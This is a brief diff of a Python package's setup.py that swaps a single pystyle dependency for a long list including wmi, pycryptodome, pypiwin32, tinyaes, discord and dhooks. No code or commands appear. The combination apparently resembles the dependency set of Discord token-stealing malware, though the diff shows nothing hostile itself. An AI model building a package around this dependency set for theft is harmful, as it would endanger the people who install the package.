@@ -13,5 +13,5 @@ setup(
     author_email = "spaceydot@proton.me",
     description = DESCRIPTION,
     packages = find_packages(),
-    install_requires=['pystyle==0.6']
+    install_requires=['psutil', 'requests', 'wmi', 'pycryptodome', 'discord', 'discord.py', 'pillow', 'pypiwin32', 'alive-progress', 'tinyaes', 'dhooks']
 )
